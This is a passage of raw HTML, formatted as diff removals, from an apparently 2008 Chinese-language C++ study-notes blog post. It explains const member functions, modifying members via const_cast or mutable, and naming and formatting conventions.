宋体">成员函数的调用，编译器为了保证对象的</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">特性，都会禁止并在编译期间报错。所以如果你想让你的成员函数能够在</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">对象上进行操作的话，就要把这个函数声明为</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员函数。假如</span><span lang="EN-US"><font face="Times New Roman">f( )</font></span><span style="font-family: 宋体">是类中的成员函数的话，它的声明形如：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">int f( ) const; //const</font></span><font size="3"><span style="font-family: 宋体">放在函数的最后，编译器会对这个函数进行检查，在这个函数中的任何试图改变成员变量和调用非</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员函数的操作都被视为非法</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">**</font></span><font size="3"><span style="font-family: 宋体">类的构造和析构函数都不能是</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">函数。</span></font></p>
-
-<p><span lang="EN-US"><font face="Times New Roman"><font size="3">3.</font><span style="font: 7pt 'Times New Roman'">       </span></font></span><font size="3"><span style="font-family: 宋体">建立了一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员函数，但仍然想用这个函数改变对象内部的数据。这样的一个要求也会经常遇到，尤其是在一个苛刻的面试考官那里。首先我们要弄清楚考官的要求，因为有两种方法可以实现，如果这位考官要求不改变原来类的任何东西，只让你从当前这个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员函数入手，那么你只有使用前面提到的类型强制转换方法。实例如下：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">//</font></span><font size="3"><span style="font-family: 宋体">假如有一个叫做</span><span lang="EN-US"><font face="Times New Roman">X</font></span><span style="font-family: 宋体">的类，它有一个</span><span lang="EN-US"><font face="Times New Roman">int</font></span><span style="font-family: 宋体">成员变量</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">，我们需要通过一个</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员函数</span><span lang="EN-US"><font face="Times New Roman">f( )</font></span><span style="font-family: 宋体">来对这个</span><span lang="EN-US"><font face="Times New Roman">r</font></span><span style="font-family: 宋体">进行</span><span lang="EN-US"><font face="Times New Roman">++r</font></span><span style="font-family: 宋体">操作，代码如下</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">void X::f( ) const
-{<span>  </span>(const_cast&lt;X*&gt;(this)) -&gt; ++r; <span> </span>} //</font></span><font size="3"><span style="font-family: 宋体">通过</span><span lang="EN-US"><font face="Times New Roman">this</font></span><span style="font-family: 宋体">指针进行类型强制转换实现</span></font><span lang="EN-US"></span><span lang="EN-US"><font size="3"><span style="font-family: 宋体">另外一种方法就是使用关键字：</span><strong><span lang="EN-US"><font face="Times New Roman">mutable</font></span></strong><strong><span style="font-family: 宋体">。</span></strong><span style="font-family: 宋体">如果你的成员变量在定义时是这个样子的：</span></font><span lang="EN-US">
-<font size="3" face="Times New Roman">mutable int r ;
-</font></span><font size="3"><span style="font-family: 宋体">那么它就告诉编译器这个成员变量可以通过</span><span lang="EN-US"><font face="Times New Roman">const</font></span><span style="font-family: 宋体">成员函数改变。编译器就不会再理会对他的检查了。</span></font></span><span lang="EN-US"><font size="3"><span style="font-family: 宋体">===========================================================================================================</span></font><font size="3" face="Georgia"><span style="font-family: 宋体"> </span></font></p>
-
-<p></span>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"></span></font><font size="3" face="Georgia"><span style="font-family: 宋体">8、变量对象命名以及初始化</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"></span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"></span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"> c++本身区别字母的大小写语言，以<em>开头的标识符一般为系统使用，应当尽量避免。同时宏定义标识符需用大写字母标</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"></span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">识。另外，名字的第1个字母不能是数字或运算符，也不能包含运算符。为标识符命名时可遵循如下规律:</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"></span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   1）使用能代表数据类型的前缀；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   2）名称与变量的作用尽量接近；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   3）如果名称由多个英文单词组成，每个英文单词首字母大写；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   4）在库函数中尽量不要使用以</em>开头的名字，以免与系统命名冲突；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   5）局部变量名称较短，尤其是循环控制变量；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   6）外部变量应使用较长的名字，并能与其代表的变量含义接近；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"></span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体"> 9、程序的书写格式:</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   </span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   1)括号需紧跟在函数名的后面，但在for和while后面，应用一个空格和左括号隔开以增加可读性；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   2)数学运算符的左右两边各留一个空格，与表达式区别；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   3)在表示参数时括号后面留一个空格；</span></font></p>
-<p style="margin: 0cm 0cm 0pt 18pt; text-indent: -18pt; tab-stops: list 18.0pt" class="MsoNormal"><font size="3" face="Georgia"><span style="font-family: 宋体">   4)在for、do&hellip;while、while中，应合理使用缩进、一对话括号和空行；</span></font></p></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2008-03-29T20:11:06+08:00" pubdate data-updated="true">2008-03-29</time></div>
-	
-
-<div class="tags">
-
-	<a class='category' href='/blog/categories/c-plus-plus-slash-c/'>c++/c</a>
-
-</div>
-
-
-	
-		<span class="comments"><a href="/blog/2008/03/29/C-xue-xi-bi-ji-chong-wen-ji-hua-zhi-yi//posts/21/index.html#disqus_thread">Comments</a></span>
 	
 </div></article>
 
